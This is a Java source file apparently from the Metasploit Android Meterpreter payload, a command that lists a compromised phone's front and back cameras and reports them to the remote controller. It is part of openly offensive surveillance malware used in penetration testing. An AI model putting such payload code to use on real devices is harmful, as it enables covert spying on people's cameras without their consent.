
package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import android.util.Log;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class webcam_list_android extends webcam_audio_record implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_WEBCAM_NAME = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 4);

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        try {
            Class<?> cameraClass = Class.forName("android.hardware.Camera");
            Object cameraInfo = null;
            Field field = null;
            int cameraCount = 0;
            try {
                Method getNumberOfCamerasMethod = cameraClass.getMethod("getNumberOfCameras");
                cameraCount = (Integer)getNumberOfCamerasMethod.invoke(null, (Object[])null);
            } catch (NoSuchMethodException nsme) {
                response.add(TLV_TYPE_WEBCAM_NAME, "Default Camera"); // Pre 2.2 device
                return ERROR_SUCCESS;
            }
            Class<?> cameraInfoClass = Class.forName("android.hardware.Camera$CameraInfo");
            if (cameraInfoClass != null) {
                cameraInfo = cameraInfoClass.newInstance();
            }
            if (cameraInfo != null) {
                field = cameraInfo.getClass().getField("facing");
            }
            Method getCameraInfoMethod = cameraClass.getMethod("getCameraInfo", Integer.TYPE, cameraInfoClass);
            if (getCameraInfoMethod != null && cameraInfoClass != null && field != null) {
                for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
                    getCameraInfoMethod.invoke(null, camIdx, cameraInfo);
                    int facing = field.getInt(cameraInfo);
                    if (facing == 1) { // Camera.CameraInfo.CAMERA_FACING_FRONT
                        response.addOverflow(TLV_TYPE_WEBCAM_NAME, "Front Camera");
                    } else {
                        response.addOverflow(TLV_TYPE_WEBCAM_NAME, "Back Camera");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(getClass().getSimpleName(), "webcam error ", e);
        }

        return ERROR_SUCCESS;
    }
}
